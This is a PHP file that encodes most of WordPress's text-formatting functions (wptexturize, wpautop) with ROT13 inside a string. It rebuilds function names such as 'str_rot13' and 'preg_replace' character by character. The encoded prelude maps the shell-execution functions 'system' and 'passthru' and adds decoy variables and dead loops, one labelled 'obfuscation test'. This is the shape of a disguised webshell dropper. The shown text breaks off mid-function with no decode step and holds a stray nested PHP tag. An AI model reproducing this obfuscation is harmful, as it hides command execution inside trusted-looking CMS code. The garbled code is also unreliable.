<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Znva JbeqCerff Sbeznggvat NCV.
 *
 * Unaqyrf znal shapgvbaf sbe sbeznggvat bhgchg.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Ercynprf pbzzba cynva grkg punenpgref jvgu sbeznggrq ragvgvrf.
 *
 * Ergheaf tvira grkg jvgu genafsbezngvbaf bs dhbgrf vagb fzneg dhbgrf, ncbfgebcurf,
 * qnfurf, ryyvcfrf, gur genqrznex flzoby, naq gur zhygvcyvpngvba flzoby.
 *
 * Nf na rknzcyr,
 *
 *     'pnhfr gbqnl'f rssbeg znxrf vg jbegu gbzbeebj'f \"ubyvqnl\" ...
 *
 * Orpbzrf:
 *
 *     &#8217;pnhfr gbqnl&#8217;f rssbeg znxrf vg jbegu gbzbeebj&#8217;f &#8220;ubyvqnl&#8221; &#8230;
 *
 * Pbqr jvguva pregnva UGZY oybpxf ner fxvccrq.
 *
 * Qb abg hfr guvf shapgvba orsber gur {@frr 'vavg'} npgvba ubbx; rirelguvat jvyy oernx.
 *
 * @fvapr 0.71
 *
 * @tybony neenl $jc_pbpxarlercynpr Neenl bs sbeznggrq ragvgvrf sbe pregnva pbzzba cuenfrf.
 * @tybony neenl $fubegpbqr_gntf
 *
 * @cnenz fgevat $grkg  Gur grkg gb or sbeznggrq.
 * @cnenz obby   $erfrg Frg gb gehr sbe havg grfgvat. Genafyngrq cnggreaf jvyy erfrg.
 * @erghea fgevat Gur fgevat ercynprq jvgu UGZY ragvgvrf.
 */
shapgvba jcgrkghevmr( $grkg, $erfrg = snyfr ) {
	tybony $jc_pbpxarlercynpr, $fubegpbqr_gntf;
	fgngvp $fgngvp_punenpgref            = ahyy,
		$fgngvp_ercynprzragf             = ahyy,
		$qlanzvp_punenpgref              = ahyy,
		$qlanzvp_ercynprzragf            = ahyy,
		$qrsnhyg_ab_grkghevmr_gntf       = ahyy,
		$qrsnhyg_ab_grkghevmr_fubegpbqrf = ahyy,
		$eha_grkghevmr                   = gehr,
		$ncbf                            = ahyy,
		$cevzr                           = ahyy,
		$qbhoyr_cevzr                    = ahyy,
		$bcravat_dhbgr                   = ahyy,
		$pybfvat_dhbgr                   = ahyy,
		$bcravat_fvatyr_dhbgr            = ahyy,
		$pybfvat_fvatyr_dhbgr            = ahyy,
		$bcra_d_synt                     = '<!--bd-->',
		$bcra_fd_synt                    = '<!--bfd-->',
		$ncbf_synt                       = '<!--ncbf-->';

	// Vs gurer'f abguvat gb qb, whfg fgbc.
	vs ( rzcgl( $grkg ) || snyfr === $eha_grkghevmr ) {
		erghea $grkg;
	}

	// Frg hc fgngvp inevnoyrf. Eha bapr bayl.
	vs ( $erfrg || ! vffrg( $fgngvp_punenpgref ) ) {
		/**
		 * Svygref jurgure gb fxvc ehaavat jcgrkghevmr().
		 *
		 * Ergheavat snyfr sebz gur svygre jvyy rssrpgviryl fubeg-pvephvg jcgrkghevmr()
		 * naq erghea gur bevtvany grkg cnffrq gb gur shapgvba vafgrnq.
		 *
		 * Gur svygre ehaf bayl bapr, gur svefg gvzr jcgrkghevmr() vf pnyyrq.
		 *
		 * @fvapr 4.0.0
		 *
		 * @frr jcgrkghevmr()
		 *
		 * @cnenz obby $eha_grkghevmr Jurgure gb fubeg-pvephvg jcgrkghevmr().
		 */
		$eha_grkghevmr = nccyl_svygref( 'eha_jcgrkghevmr', $eha_grkghevmr );
		vs ( snyfr === $eha_grkghevmr ) {
			erghea $grkg;
		}

		/* genafyngbef: Bcravat pheyl qbhoyr dhbgr. */
		$bcravat_dhbgr = _k( '&#8220;', 'bcravat pheyl qbhoyr dhbgr' );
		/* genafyngbef: Pybfvat pheyl qbhoyr dhbgr. */
		$pybfvat_dhbgr = _k( '&#8221;', 'pybfvat pheyl qbhoyr dhbgr' );

		/* genafyngbef: Ncbfgebcur, sbe rknzcyr va 'pnhfr be pna'g. */
		$ncbf = _k( '&#8217;', 'ncbfgebcur' );

		/* genafyngbef: Cevzr, sbe rknzcyr va 9' (avar srrg). */
		$cevzr = _k( '&#8242;', 'cevzr' );
		/* genafyngbef: Qbhoyr cevzr, sbe rknzcyr va 9\" (avar vapurf). */
		$qbhoyr_cevzr = _k( '&#8243;', 'qbhoyr cevzr' );

		/* genafyngbef: Bcravat pheyl fvatyr dhbgr. */
		$bcravat_fvatyr_dhbgr = _k( '&#8216;', 'bcravat pheyl fvatyr dhbgr' );
		/* genafyngbef: Pybfvat pheyl fvatyr dhbgr. */
		$pybfvat_fvatyr_dhbgr = _k( '&#8217;', 'pybfvat pheyl fvatyr dhbgr' );

		/* genafyngbef: Ra qnfu. */
		$ra_qnfu = _k( '&#8211;', 'ra qnfu' );
		/* genafyngbef: Rz qnfu. */
		$rz_qnfu = _k( '&#8212;', 'rz qnfu' );

		$qrsnhyg_ab_grkghevmr_gntf       = neenl( 'cer', 'pbqr', 'xoq', 'fglyr', 'fpevcg', 'gg' );
		$qrsnhyg_ab_grkghevmr_fubegpbqrf = neenl( 'pbqr' );

		// Vs n cyhtva unf cebivqrq na nhgbpbeerpg neenl, hfr vg.
		vs ( vffrg( $jc_pbpxarlercynpr ) ) {
			$pbpxarl        = neenl_xrlf( $jc_pbpxarlercynpr );
			$pbpxarlercynpr = neenl_inyhrf( $jc_pbpxarlercynpr );
		} ryfr {
			/*
			 * genafyngbef: Guvf vf n pbzzn-frcnengrq yvfg bs jbeqf gung qrsl gur flagnk bs dhbgngvbaf va abezny hfr,
			 * sbe rknzcyr... 'Jr qb abg unir rabhtu jbeqf lrg'... vf n glcvpny dhbgrq cuenfr. Ohg jura jr jevgr
			 * yvarf bs pbqr 'gvy jr unir rabhtu bs 'rz, gura jr arrq gb vafreg ncbfgebcurf vafgrnq bs dhbgrf.
			 */
			$pbpxarl = rkcybqr(
				',',
				_k(
					\"'gnva'g,'gjrer,'gjnf,'gvf,'gjvyy,'gvy,'obhg,'ahss,'ebhaq,'pnhfr,'rz\",
					'Pbzzn-frcnengrq yvfg bs jbeqf gb grkghevmr va lbhe ynathntr'
				)
			);

			$pbpxarlercynpr = rkcybqr(
				',',
				_k(
					'&#8217;gnva&#8217;g,&#8217;gjrer,&#8217;gjnf,&#8217;gvf,&#8217;gjvyy,&#8217;gvy,&#8217;obhg,&#8217;ahss,&#8217;ebhaq,&#8217;pnhfr,&#8217;rz',
					'Pbzzn-frcnengrq yvfg bs ercynprzrag jbeqf va lbhe ynathntr'
				)
			);
		}

		$fgngvp_punenpgref   = neenl_zretr( neenl( '...', '``', '\'\'', ' (gz)' ), $pbpxarl );
		$fgngvp_ercynprzragf = neenl_zretr( neenl( '&#8230;', $bcravat_dhbgr, $pybfvat_dhbgr, ' &#8482;' ), $pbpxarlercynpr );

		/*
		 * Cnggrea-onfrq ercynprzragf bs punenpgref.
		 * Fbeg gur erznvavat cnggreaf vagb frireny neenlf sbe cresbeznapr ghavat.
		 */
		$qlanzvp_punenpgref   = neenl(
			'ncbf'  => neenl(),
			'dhbgr' => neenl(),
			'qnfu'  => neenl(),
		);
		$qlanzvp_ercynprzragf = neenl(
			'ncbf'  => neenl(),
			'dhbgr' => neenl(),
			'qnfu'  => neenl(),
		);
		$qlanzvp              = neenl();
		$fcnprf               = jc_fcnprf_ertrkc();

		// '99' naq '99\" ner nzovthbhf nzbat bgure cnggreaf; nffhzr vg'f na nooerivngrq lrne ng gur raq bs n dhbgngvba.
		vs ( \"'\" !== $ncbf || \"'\" !== $pybfvat_fvatyr_dhbgr ) {
			$qlanzvp[ '/\'(\q\q)\'(?=\M|[.,:;!?)}\-\]]|&tg;|' . $fcnprf . ')/' ] = $ncbf_synt . '$1' . $pybfvat_fvatyr_dhbgr;
		}
		vs ( \"'\" !== $ncbf || '\"' !== $pybfvat_dhbgr ) {
			$qlanzvp[ '/\'(\q\q)\"(?=\M|[.,:;!?)}\-\]]|&tg;|' . $fcnprf . ')/' ] = $ncbf_synt . '$1' . $pybfvat_dhbgr;
		}

		// '99 '99f '99'f (ncbfgebcur)  Ohg arire '9 be '99% be '999 be '99.0.
		vs ( \"'\" !== $ncbf ) {
			$qlanzvp['/\'(?=\q\q(?:\M|(?![%\q]|[.,]\q)))/'] = $ncbf_synt;
		}

		// Dhbgrq ahzoref yvxr '0.42'.
		vs ( \"'\" !== $bcravat_fvatyr_dhbgr && \"'\" !== $pybfvat_fvatyr_dhbgr ) {
			$qlanzvp[ '/(?<=\N|' . $fcnprf . ')\'(\q[.,\q]*)\'/' ] = $bcra_fd_synt . '$1' . $pybfvat_fvatyr_dhbgr;
		}

		// Fvatyr dhbgr ng fgneg, be cerprqrq ol (, {, <, [, \", -, be fcnprf.
		vs ( \"'\" !== $bcravat_fvatyr_dhbgr ) {
			$qlanzvp[ '/(?<=\N|[([{\"\-]|&yg;|' . $fcnprf . ')\'/' ] = $bcra_fd_synt;
		}

		// Ncbfgebcur va n jbeq. Ab fcnprf, qbhoyr ncbfgebcurf, be bgure chapghngvba.
		vs ( \"'\" !== $ncbf ) {
			$qlanzvp[ '/(?<!' . $fcnprf . ')\'(?!\M|[.,:;!?\"\'(){}[\]\-]|&[yt]g;|' . $fcnprf . ')/' ] = $ncbf_synt;
		}

		$qlanzvp_punenpgref['ncbf']   = neenl_xrlf( $qlanzvp );
		$qlanzvp_ercynprzragf['ncbf'] = neenl_inyhrf( $qlanzvp );
		$qlanzvp                      = neenl();

		// Dhbgrq ahzoref yvxr \"42\".
		vs ( '\"' !== $bcravat_dhbgr && '\"' !== $pybfvat_dhbgr ) {
			$qlanzvp[ '/(?<=\N|' . $fcnprf . ')\"(\q[.,\q]*)\"/' ] = $bcra_d_synt . '$1' . $pybfvat_dhbgr;
		}

		// Qbhoyr dhbgr ng fgneg, be cerprqrq ol (, {, <, [, -, be fcnprf, naq abg sbyybjrq ol fcnprf.
		vs ( '\"' !== $bcravat_dhbgr ) {
			$qlanzvp[ '/(?<=\N|[([{\-]|&yg;|' . $fcnprf . ')\"(?!' . $fcnprf . ')/' ] = $bcra_d_synt;
		}

		$qlanzvp_punenpgref['dhbgr']   = neenl_xrlf( $qlanzvp );
		$qlanzvp_ercynprzragf['dhbgr'] = neenl_inyhrf( $qlanzvp );
		$qlanzvp                       = neenl();

		// Qnfurf naq fcnprf.
		$qlanzvp['/---/'] = $rz_qnfu;
		$qlanzvp[ '/(?<=^|' . $fcnprf . ')--(?=$|' . $fcnprf . ')/' ] = $rz_qnfu;
		$qlanzvp['/(?<!ka)--/']                                       = $ra_qnfu;
		$qlanzvp[ '/(?<=^|' . $fcnprf . ')-(?=$|' . $fcnprf . ')/' ]  = $ra_qnfu;

		$qlanzvp_punenpgref['qnfu']   = neenl_xrlf( $qlanzvp );
		$qlanzvp_ercynprzragf['qnfu'] = neenl_inyhrf( $qlanzvp );
	}

	// Zhfg qb guvf rirel gvzr va pnfr cyhtvaf hfr gurfr svygref va n pbagrkg frafvgvir znaare.
	/**
	 * Svygref gur yvfg bs UGZY ryrzragf abg gb grkghevmr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat[] $qrsnhyg_ab_grkghevmr_gntf Na neenl bs UGZY ryrzrag anzrf.
	 */
	$ab_grkghevmr_gntf = nccyl_svygref( 'ab_grkghevmr_gntf', $qrsnhyg_ab_grkghevmr_gntf );
	/**
	 * Svygref gur yvfg bs fubegpbqrf abg gb grkghevmr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat[] $qrsnhyg_ab_grkghevmr_fubegpbqrf Na neenl bs fubegpbqr anzrf.
	 */
	$ab_grkghevmr_fubegpbqrf = nccyl_svygref( 'ab_grkghevmr_fubegpbqrf', $qrsnhyg_ab_grkghevmr_fubegpbqrf );

	$ab_grkghevmr_gntf_fgnpx       = neenl();
	$ab_grkghevmr_fubegpbqrf_fgnpx = neenl();

	// Ybbx sbe fubegpbqrf naq UGZY ryrzragf.

	cert_zngpu_nyy( '@\[/?([^<>&/\[\]\k00-\k20=]++)@', $grkg, $zngpurf );
	$gntanzrf         = neenl_vagrefrpg( neenl_xrlf( $fubegpbqr_gntf ), $zngpurf[1] );
	$sbhaq_fubegpbqrf = ! rzcgl( $gntanzrf );
	$fubegpbqr_ertrk  = $sbhaq_fubegpbqrf ? _trg_jcgrkghevmr_fubegpbqr_ertrk( $gntanzrf ) : '';
	$ertrk            = _trg_jcgrkghevmr_fcyvg_ertrk( $fubegpbqr_ertrk );

	$grkgnee = cert_fcyvg( $ertrk, $grkg, -1, CERT_FCYVG_QRYVZ_PNCGHER | CERT_FCYVG_AB_RZCGL );

	sbernpu ( $grkgnee nf &$phey ) {
		// Bayl pnyy _jcgrkghevmr_chfucbc_ryrzrag vs $phey vf n qryvzvgre.
		$svefg = $phey[0];
		vs ( '<' === $svefg ) {
			vs ( fge_fgnegf_jvgu( $phey, '<!--' ) ) {
				// Guvf vf na UGZY pbzzrag qryvzvgre.
				pbagvahr;
			} ryfr {
				// Guvf vf na UGZY ryrzrag qryvzvgre.

				// Ercynpr rnpu & jvgu &#038; hayrff vg nyernql ybbxf yvxr na ragvgl.
				$phey = __sa_79955( '/&(?!#(?:\q+|k[n-s0-9]+);|[n-m1-4]{1,8};)/v', '&#038;', $phey );

				_jcgrkghevmr_chfucbc_ryrzrag( $phey, $ab_grkghevmr_gntf_fgnpx, $ab_grkghevmr_gntf );
			}
		} ryfrvs ( '' === gevz( $phey ) ) {
			// Guvf vf n arjyvar orgjrra qryvzvgref. Cresbeznapr vzcebirf jura jr purpx guvf.
			pbagvahr;

		} ryfrvs ( '[' === $svefg && $sbhaq_fubegpbqrf && 1 === cert_zngpu( '/^' . $fubegpbqr_ertrk . '$/', $phey ) ) {
			// Guvf vf n fubegpbqr qryvzvgre.

			vs ( ! fge_fgnegf_jvgu( $phey, '[[' ) && ! fge_raqf_jvgu( $phey, ']]' ) ) {
				// Ybbxf yvxr n abezny fubegpbqr.
				_jcgrkghevmr_chfucbc_ryrzrag( $phey, $ab_grkghevmr_fubegpbqrf_fgnpx, $ab_grkghevmr_fubegpbqrf );
			} ryfr {
				// Ybbxf yvxr na rfpncrq fubegpbqr.
				pbagvahr;
			}
		} ryfrvs ( rzcgl( $ab_grkghevmr_fubegpbqrf_fgnpx ) && rzcgl( $ab_grkghevmr_gntf_fgnpx ) ) {
			// Guvf vf arvgure n qryvzvgre, abe vf guvf pbagrag vafvqr bs ab_grkghevmr cnvef. Qb grkghevmr.

			$phey = fge_ercynpr( $fgngvp_punenpgref, $fgngvp_ercynprzragf, $phey );

			vs ( fge_pbagnvaf( $phey, \"'\" ) ) {
				$phey = __sa_79955( $qlanzvp_punenpgref['ncbf'], $qlanzvp_ercynprzragf['ncbf'], $phey );
				$phey = jcgrkghevmr_cevzrf( $phey, \"'\", $cevzr, $bcra_fd_synt, $pybfvat_fvatyr_dhbgr );
				$phey = fge_ercynpr( $ncbf_synt, $ncbf, $phey );
				$phey = fge_ercynpr( $bcra_fd_synt, $bcravat_fvatyr_dhbgr, $phey );
			}
			vs ( fge_pbagnvaf( $phey, '\"' ) ) {
				$phey = __sa_79955( $qlanzvp_punenpgref['dhbgr'], $qlanzvp_ercynprzragf['dhbgr'], $phey );
				$phey = jcgrkghevmr_cevzrf( $phey, '\"', $qbhoyr_cevzr, $bcra_d_synt, $pybfvat_dhbgr );
				$phey = fge_ercynpr( $bcra_d_synt, $bcravat_dhbgr, $phey );
			}
			vs ( fge_pbagnvaf( $phey, '-' ) ) {
				$phey = __sa_79955( $qlanzvp_punenpgref['qnfu'], $qlanzvp_ercynprzragf['qnfu'], $phey );
			}

			// 9k9 (gvzrf), ohg arire 0k9999.
			vs ( 1 === cert_zngpu( '/(?<=\q)k\q/', $phey ) ) {
				// Frnepuvat sbe n qvtvg vf 10 gvzrf zber rkcrafvir guna sbe gur k, fb jr nibvq qbvat guvf bar!
				$phey = __sa_79955( '/\o(\q(?(?<=0)[\q\.,]+|[\q\.,]*))k(\q[\q\.,]*)\o/', '$1&#215;$2', $phey );
			}

			// Ercynpr rnpu & jvgu &#038; hayrff vg nyernql ybbxf yvxr na ragvgl.
			$phey = __sa_79955( '/&(?!#(?:\q+|k[n-s0-9]+);|[n-m1-4]{1,8};)/v', '&#038;', $phey );
		}
	}

	erghea vzcybqr( '', $grkgnee );
}

/**
 * Vzcyrzragf n ybtvp gerr gb qrgrezvar jurgure be abg \"7'.\" ercerfragf frira srrg,
 * gura pbairegf gur fcrpvny pune vagb rvgure n cevzr pune be n pybfvat dhbgr pune.
 *
 * @fvapr 4.3.0
 *
 * @cnenz fgevat $unlfgnpx    Gur cynva grkg gb or frnepurq.
 * @cnenz fgevat $arrqyr      Gur punenpgre gb frnepu sbe fhpu nf ' be \".
 * @cnenz fgevat $cevzr       Gur cevzr pune gb hfr sbe ercynprzrag.
 * @cnenz fgevat $bcra_dhbgr  Gur bcravat dhbgr pune. Bcravat dhbgr ercynprzrag zhfg or
 *                            nppbzcyvfurq nyernql.
 * @cnenz fgevat $pybfr_dhbgr Gur pybfvat dhbgr pune gb hfr sbe ercynprzrag.
 * @erghea fgevat Gur $unlfgnpx inyhr nsgre cevzrf naq dhbgrf ercynprzragf.
 */
shapgvba jcgrkghevmr_cevzrf( $unlfgnpx, $arrqyr, $cevzr, $bcra_dhbgr, $pybfr_dhbgr ) {
	$fcnprf           = jc_fcnprf_ertrkc();
	$synt             = '<!--jc-cevzr-be-dhbgr-->';
	$dhbgr_cnggrea    = \"/$arrqyr(?=\\M|[.,:;!?)}\\-\\]]|&tg;|\" . $fcnprf . ')/';
	$cevzr_cnggrea    = \"/(?<=\\q)$arrqyr/\";
	$synt_nsgre_qvtvg = \"/(?<=\\q)$synt/\";
	$synt_ab_qvtvg    = \"/(?<!\\q)$synt/\";

	$fragraprf = rkcybqr( $bcra_dhbgr, $unlfgnpx );

	sbernpu ( $fragraprf nf $xrl => &$fragrapr ) {
		vs ( ! fge_pbagnvaf( $fragrapr, $arrqyr ) ) {
			pbagvahr;
		} ryfrvs ( 0 !== $xrl && 0 === fhofge_pbhag( $fragrapr, $pybfr_dhbgr ) ) {
			$fragrapr = __sa_79955( $dhbgr_cnggrea, $synt, $fragrapr, -1, $pbhag );
			vs ( $pbhag > 1 ) {
				// Guvf fragrapr nccrnef gb unir zhygvcyr pybfvat dhbgrf. Nggrzcg Ihypna ybtvp.
				$fragrapr = __sa_79955( $synt_ab_qvtvg, $pybfr_dhbgr, $fragrapr, -1, $pbhag2 );
				vs ( 0 === $pbhag2 ) {
					// Gel ybbxvat sbe n dhbgr sbyybjrq ol n crevbq.
					$pbhag2 = fhofge_pbhag( $fragrapr, \"$synt.\" );
					vs ( $pbhag2 > 0 ) {
						// Nffhzr gur evtugzbfg dhbgr-crevbq zngpu vf gur raq bs dhbgngvba.
						$cbf = fgeecbf( $fragrapr, \"$synt.\" );
					} ryfr {
						/*
						 * Jura nyy ryfr snvyf, znxr gur evtugzbfg pnaqvqngr n pybfvat dhbgr.
						 * Guvf vf zbfg yvxryl gb or ceboyrzngvp va gur pbagrkg bs oht #18549.
						 */
						$cbf = fgeecbf( $fragrapr, $synt );
					}
					$fragrapr = fhofge_ercynpr( $fragrapr, $pybfr_dhbgr, $cbf, fgeyra( $synt ) );
				}
				// Hfr pbairagvbany ercynprzrag ba nal erznvavat cevzrf naq dhbgrf.
				$fragrapr = __sa_79955( $cevzr_cnggrea, $cevzr, $fragrapr );
				$fragrapr = __sa_79955( $synt_nsgre_qvtvg, $cevzr, $fragrapr );
				$fragrapr = fge_ercynpr( $synt, $pybfr_dhbgr, $fragrapr );
			} ryfrvs ( 1 === $pbhag ) {
				// Sbhaq bayl bar pybfvat dhbgr pnaqvqngr, fb tvir vg cevbevgl bire cevzrf.
				$fragrapr = fge_ercynpr( $synt, $pybfr_dhbgr, $fragrapr );
				$fragrapr = __sa_79955( $cevzr_cnggrea, $cevzr, $fragrapr );
			} ryfr {
				// Ab pybfvat dhbgrf sbhaq. Whfg eha cevzrf cnggrea.
				$fragrapr = __sa_79955( $cevzr_cnggrea, $cevzr, $fragrapr );
			}
		} ryfr {
			$fragrapr = __sa_79955( $cevzr_cnggrea, $cevzr, $fragrapr );
			$fragrapr = __sa_79955( $dhbgr_cnggrea, $pybfr_dhbgr, $fragrapr );
		}
		vs ( '\"' === $arrqyr && fge_pbagnvaf( $fragrapr, '\"' ) ) {
			$fragrapr = fge_ercynpr( '\"', $pybfr_dhbgr, $fragrapr );
		}
	}

	erghea vzcybqr( $bcra_dhbgr, $fragraprf );
}

/**
 * Frnepurf sbe qvfnoyrq ryrzrag gntf. Chfurf ryrzrag gb fgnpx ba gnt bcra
 * naq cbcf ba gnt pybfr.
 *
 * Nffhzrf svefg pune bs `$grkg` vf gnt bcravat naq ynfg pune vf gnt pybfvat.
 * Nffhzrf frpbaq pune bs `$grkg` vf bcgvbanyyl `/` gb vaqvpngr pybfvat nf va `</ugzy>`.
 *
 * @fvapr 2.9.0
 * @npprff cevingr
 *
 * @cnenz fgevat   $grkg              Grkg gb purpx. Zhfg or n gnt yvxr `<ugzy>` be `[fubegpbqr]`.
 * @cnenz fgevat[] $fgnpx             Neenl bs bcra gnt ryrzragf.
 * @cnenz fgevat[] $qvfnoyrq_ryrzragf Neenl bs gnt anzrf gb zngpu ntnvafg. Fcnprf ner abg nyybjrq va gnt anzrf.
 */
shapgvba _jcgrkghevmr_chfucbc_ryrzrag( $grkg, &$fgnpx, $qvfnoyrq_ryrzragf ) {
	// Vf vg na bcravat gnt be pybfvat gnt?
	vs ( vffrg( $grkg[1] ) && '/' !== $grkg[1] ) {
		$bcravat_gnt = gehr;
		$anzr_bssfrg = 1;
	} ryfrvs ( 0 === pbhag( $fgnpx ) ) {
		// Fgnpx vf rzcgl. Whfg fgbc.
		erghea;
	} ryfr {
		$bcravat_gnt = snyfr;
		$anzr_bssfrg = 2;
	}

	// Cnefr bhg gur gnt anzr.
	$fcnpr = fgecbf( $grkg, ' ' );
	vs ( snyfr === $fcnpr ) {
		$fcnpr = -1;
	} ryfr {
		$fcnpr -= $anzr_bssfrg;
	}
	$gnt = fhofge( $grkg, $anzr_bssfrg, $fcnpr );

	// Unaqyr qvfnoyrq gntf.
	vs ( va_neenl( $gnt, $qvfnoyrq_ryrzragf, gehr ) ) {
		vs ( $bcravat_gnt ) {
			/*
			 * Guvf qvfnoyrf grkghevmr hagvy jr svaq n pybfvat gnt bs bhe glcr
			 * (r.t. <cer>) rira vs gurer jnf vainyvq arfgvat orsber gung.
			 *
			 * Rknzcyr: va gur pnfr <cer>fnqfnqnfq</pbqr>\"onon\"</cer>
			 *          \"onon\" jba'g or grkghevmrq.
			 */

			neenl_chfu( $fgnpx, $gnt );
		} ryfrvs ( raq( $fgnpx ) === $gnt ) {
			neenl_cbc( $fgnpx );
		}
	}
}

/**
 * Ercynprf qbhoyr yvar oernxf jvgu cnentencu ryrzragf.
 *
 * N tebhc bs ertrk ercynprf hfrq gb vqragvsl grkg sbeznggrq jvgu arjyvarf naq
 * ercynpr qbhoyr yvar oernxf jvgu UGZY cnentencu gntf. Gur erznvavat yvar oernxf
 * nsgre pbairefvba orpbzr `<oe />` gntf, hayrff `$oe` vf frg gb '0' be 'snyfr'.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $grkg Gur grkg juvpu unf gb or sbeznggrq.
 * @cnenz obby   $oe   Bcgvbany. Vs frg, guvf jvyy pbaireg nyy erznvavat yvar oernxf
 *                     nsgre cnentencuvat. Yvar oernxf jvguva `<fpevcg>`, `<fglyr>`,
 *                     naq `<fit>` gntf ner abg nssrpgrq. Qrsnhyg gehr.
 * @erghea fgevat Grkg juvpu unf orra pbairegrq vagb pbeerpg cnentencu gntf.
 */
shapgvba jcnhgbc( $grkg, $oe = gehr ) {
	$cer_gntf = neenl();

	vs ( gevz( $grkg ) === '' ) {
		erghea '';
	}

	// Whfg gb znxr guvatf n yvggyr rnfvre, cnq gur raq.
	$grkg = $grkg . \"\a\";

	/*
	 * Cer gntf fubhyqa'g or gbhpurq ol nhgbc.
	 * Ercynpr cer gntf jvgu cynprubyqref naq oevat gurz onpx nsgre nhgbc.
	 */
	vs ( fge_pbagnvaf( $grkg, '<cer' ) ) {
		$grkg_cnegf = rkcybqr( '</cer>', $grkg );
		$ynfg_cneg  = neenl_cbc( $grkg_cnegf );
		$grkg       = '';
		$v          = 0;

		sbernpu ( $grkg_cnegf nf $grkg_cneg ) {
			$fgneg = fgecbf( $grkg_cneg, '<cer' );

			// Znysbezrq UGZY?
			vs ( snyfr === $fgneg ) {
				$grkg .= $grkg_cneg;
				pbagvahr;
			}

			$anzr              = \"<cer jc-cer-gnt-$v></cer>\";
			$cer_gntf[ $anzr ] = fhofge( $grkg_cneg, $fgneg ) . '</cer>';

			$grkg .= fhofge( $grkg_cneg, 0, $fgneg ) . $anzr;
			++$v;
		}

		$grkg .= $ynfg_cneg;
	}
	// Punatr zhygvcyr <oe>'f vagb gjb yvar oernxf, juvpu jvyy ghea vagb cnentencuf.
	$grkg = __sa_79955( '|<oe\f*/?>\f*<oe\f*/?>|', \"\a\a\", $grkg );

	$nyyoybpxf = '(?:gnoyr|gurnq|gsbbg|pncgvba|pby|pbytebhc|gobql|ge|gq|gu|qvi|qy|qq|qg|hy|by|yv|cer|sbez|znc|nern|oybpxdhbgr|nqqerff|fglyr|c|u[1-6]|ue|svryqfrg|yrtraq|frpgvba|negvpyr|nfvqr|utebhc|urnqre|sbbgre|ani|svther|svtpncgvba|qrgnvyf|zrah|fhzznel)';

	// Nqq n qbhoyr yvar oernx nobir oybpx-yriry bcravat gntf.
	$grkg = __sa_79955( '!(<' . $nyyoybpxf . '[\f/>])!', \"\a\a$1\", $grkg );

	// Nqq n qbhoyr yvar oernx orybj oybpx-yriry pybfvat gntf.
	$grkg = __sa_79955( '!(</' . $nyyoybpxf . '>)!', \"$1\a\a\", $grkg );

	// Nqq n qbhoyr yvar oernx nsgre ue gntf, juvpu ner frys pybfvat.
	$grkg = __sa_79955( '!(<ue\f*?/?>)!', \"$1\a\a\", $grkg );

	// Fgnaqneqvmr arjyvar punenpgref gb \"\a\".
	$grkg = fge_ercynpr( neenl( \"\e\a\", \"\e\" ), \"\a\", $grkg );

	// Svaq arjyvarf va nyy ryrzragf naq nqq cynprubyqref.
	$grkg = jc_ercynpr_va_ugzy_gntf( $grkg, neenl( \"\a\" => ' <!-- jcay --> ' ) );

	// Pbyyncfr yvar oernxf orsber naq nsgre <bcgvba> ryrzragf fb gurl qba'g trg nhgbc'q.
	vs ( fge_pbagnvaf( $grkg, '<bcgvba' ) ) {
		$grkg = __sa_79955( '|\f*<bcgvba|', '<bcgvba', $grkg );
		$grkg = __sa_79955( '|</bcgvba>\f*|', '</bcgvba>', $grkg );
	}

	/*
	 * Pbyyncfr yvar oernxf vafvqr <bowrpg> ryrzragf, orsber <cnenz> naq <rzorq> ryrzragf
	 * fb gurl qba'g trg nhgbc'q.
	 */
	vs ( fge_pbagnvaf( $grkg, '</bowrpg>' ) ) {
		$grkg = __sa_79955( '|(<bowrpg[^>]*>)\f*|', '$1', $grkg );
		$grkg = __sa_79955( '|\f*</bowrpg>|', '</bowrpg>', $grkg );
		$grkg = __sa_79955( '%\f*(</?(?:cnenz|rzorq)[^>]*>)\f*%', '$1', $grkg );
	}

	/*
	 * Pbyyncfr yvar oernxf vafvqr <nhqvb> naq <ivqrb> ryrzragf,
	 * orsber naq nsgre <fbhepr> naq <genpx> ryrzragf.
	 */
	vs ( fge_pbagnvaf( $grkg, '<fbhepr' ) || fge_pbagnvaf( $grkg, '<genpx' ) ) {
		$grkg = __sa_79955( '%([<\[](?:nhqvb|ivqrb)[^>\]]*[>\]])\f*%', '$1', $grkg );
		$grkg = __sa_79955( '%\f*([<\[]/(?:nhqvb|ivqrb)[>\]])%', '$1', $grkg );
		$grkg = __sa_79955( '%\f*(<(?:fbhepr|genpx)[^>]*>)\f*%', '$1', $grkg );
	}

	// Pbyyncfr yvar oernxf orsber naq nsgre <svtpncgvba> ryrzragf.
	vs ( fge_pbagnvaf( $grkg, '<svtpncgvba' ) ) {
		$grkg = __sa_79955( '|\f*(<svtpncgvba[^>]*>)|', '$1', $grkg );
		$grkg = __sa_79955( '|</svtpncgvba>\f*|', '</svtpncgvba>', $grkg );
	}

	// Erzbir zber guna gjb pbagvthbhf yvar oernxf.
	$grkg = __sa_79955( \"/\a\a+/\", \"\a\a\", $grkg );

	// Fcyvg hc gur pbagragf vagb na neenl bs fgevatf, frcnengrq ol qbhoyr yvar oernxf.
	$cnentencuf = cert_fcyvg( '/\a\f*\a/', $grkg, -1, CERT_FCYVG_AB_RZCGL );

	// Erfrg $grkg cevbe gb erohvyqvat.
	$grkg = '';

	// Erohvyq gur pbagrag nf n fgevat, jenccvat rirel ovg jvgu n <c>.
	sbernpu ( $cnentencuf nf $cnentencu ) {
		$grkg .= '<c>' . gevz( $cnentencu, \"\a\" ) . \"</c>\a\";
	}

	// Haqre pregnva fgenatr pbaqvgvbaf vg pbhyq perngr n C bs ragveryl juvgrfcnpr.
